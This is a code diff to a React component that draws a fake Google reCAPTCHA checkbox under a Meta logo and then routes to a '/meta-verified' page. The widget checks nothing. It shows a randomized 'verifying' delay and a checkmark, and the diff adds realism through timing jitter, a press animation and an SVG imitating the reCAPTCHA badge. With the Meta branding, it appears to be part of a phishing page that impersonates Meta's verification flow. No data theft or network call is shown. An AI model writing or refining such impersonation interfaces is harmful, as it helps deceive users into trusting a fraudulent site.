@@ -5,27 +5,70 @@ import { useRouter } from 'next/navigation'
 
 import { en } from '@/i18n/locales/en'
 
+const VERIFY_DELAY_MS = { min: 1400, max: 2200 }
+const NAVIGATE_DELAY_MS = 650
+
+const RecaptchaBadge = () => (
+    <svg
+        aria-hidden="true"
+        className="recaptcha-badge-logo"
+        viewBox="0 0 64 64"
+        xmlns="http://www.w3.org/2000/svg"
+    >
+        <path
+            d="M32 8a24 24 0 1 0 0 48 24 24 0 0 0 0-48Z"
+            fill="#4285F4"
+            opacity="0.12"
+        />
+        <path
+            d="M32 14a18 18 0 1 1-12.73 5.27"
+            fill="none"
+            stroke="#4285F4"
+            strokeLinecap="round"
+            strokeWidth="3.5"
+        />
+        <path
+            d="M32 14a18 18 0 1 1 12.73 5.27"
+            fill="none"
+            stroke="#9AA0A6"
+            strokeLinecap="round"
+            strokeWidth="3.5"
+        />
+        <path
+            d="M32 26v12l8.5 4.9"
+            fill="none"
+            stroke="#4285F4"
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            strokeWidth="3"
+        />
+    </svg>
+)
+
 const ReCaptcha = () => {
     const captchaText = en.captcha
+    const [isPressed, setIsPressed] = React.useState(false)
     const [isLoading, setIsLoading] = React.useState(false)
     const [isVerified, setIsVerified] = React.useState(false)
     const router = useRouter()
     const verifyTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
     const navigateTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
+    const pressTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
 
     React.useEffect(() => {
         return () => {
             if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
             if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
+            if (pressTimerRef.current) clearTimeout(pressTimerRef.current)
         }
     }, [])
 
-    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-        if (!e.target.checked || isLoading || isVerified) return
-
+    const startVerification = () => {
         setIsLoading(true)
-        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
-        if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
+
+        const delay =
+            VERIFY_DELAY_MS.min +
+            Math.floor(Math.random() * (VERIFY_DELAY_MS.max - VERIFY_DELAY_MS.min))
 
         verifyTimerRef.current = setTimeout(() => {
             verifyTimerRef.current = null
@@ -35,9 +78,34 @@ const ReCaptcha = () => {
             navigateTimerRef.current = setTimeout(() => {
                 navigateTimerRef.current = null
                 router.push('/meta-verified')
-            }, 550)
-        }, 1650)
+            }, NAVIGATE_DELAY_MS)
+        }, delay)
     }
+
+    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+        if (!e.target.checked || isLoading || isVerified || isPressed) return
+
+        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
+        if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
+        if (pressTimerRef.current) clearTimeout(pressTimerRef.current)
+
+        setIsPressed(true)
+        pressTimerRef.current = setTimeout(() => {
+            pressTimerRef.current = null
+            setIsPressed(false)
+            startVerification()
+        }, 120)
+    }
+
+    const checkboxStateClass = [
+        isPressed ? 'is-pressed' : '',
+        isLoading ? 'is-loading' : '',
+        isVerified ? 'is-verified' : '',
+    ]
+        .filter(Boolean)
+        .join(' ')
+
+    const isInteractive = !isLoading && !isVerified
 
     return (
         <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
@@ -46,52 +114,55 @@ const ReCaptcha = () => {
                     <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
                 </div>
 
-                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
-                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
-                        <div className="flex flex-row items-center justify-start ml-[1rem]">
+                <div className="flex w-full items-center justify-start py-5 font-roboto">
+                    <div className="recaptcha-widget">
+                        <div className="recaptcha-widget-main">
                             <div
-                                className='relative h-[30px] w-[30px] flex items-center justify-center'
+                                className="recaptcha-checkbox-wrap"
                                 style={{ WebkitTapHighlightColor: 'transparent' }}
                             >
                                 <label
-                                    className={`recaptcha-check ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
-                                    htmlFor='checked-captcha'
+                                    className={`recaptcha-check ${isLoading ? 'cursor-wait' : isInteractive ? 'cursor-pointer' : 'cursor-default'}`}
+                                    htmlFor="checked-captcha"
                                 >
                                     <input
                                         type="checkbox"
                                         checked={isVerified}
-                                        id='checked-captcha'
+                                        id="checked-captcha"
                                         onChange={handleCheckboxChange}
                                         aria-label={captchaText.notRobot}
-                                        disabled={isLoading || isVerified}
+                                        disabled={!isInteractive}
                                         className="sr-only"
                                     />
                                     <span
                                         aria-hidden="true"
-                                        className={`recaptcha-icon ${isLoading ? 'is-loading' : ''} ${isVerified ? 'is-verified' : ''}`}
+                                        className={`recaptcha-icon ${checkboxStateClass}`}
                                     >
                                         {isLoading && (
-                                            <>
-                                                <span className="recaptcha-spinner-track" />
-                                                <span className="recaptcha-spinner-segment" />
-                                            </>
+                                            <svg viewBox="0 0 24 24" className="recaptcha-spinner-svg">
+                                                <circle className="recaptcha-spinner-bg" cx="12" cy="12" r="9.5" />
+                                                <circle className="recaptcha-spinner-arc" cx="12" cy="12" r="9.5" />
+                                            </svg>
                                         )}
                                         {isVerified && (
                                             <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
-                                                <path d="M4.5 12.5L9.2 17.1L20 6.3" />
+                                                <path d="M6.5 12.2l3.1 3.1 8.2-8.4" />
                                             </svg>
                                         )}
                                     </span>
                                 </label>
                             </div>
-                            <label htmlFor='checked-captcha' className="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">
+                            <label
+                                htmlFor="checked-captcha"
+                                className={`recaptcha-label ${isInteractive ? 'cursor-pointer' : 'cursor-default'}`}
+                            >
                                 {captchaText.notRobot}
                             </label>
                         </div>
-                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
-                            <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.5rem]" />
-                            <span className="text-[10px] font-bold">reCAPTCHA</span>
-                            <div className="text-[8px]">{captchaText.privacyTerms}</div>
+                        <div className="recaptcha-brand">
+                            <RecaptchaBadge />
+                            <span className="recaptcha-brand-title">reCAPTCHA</span>
+                            <span className="recaptcha-brand-links">{captchaText.privacyTerms}</span>
                         </div>
                     </div>
                 </div>
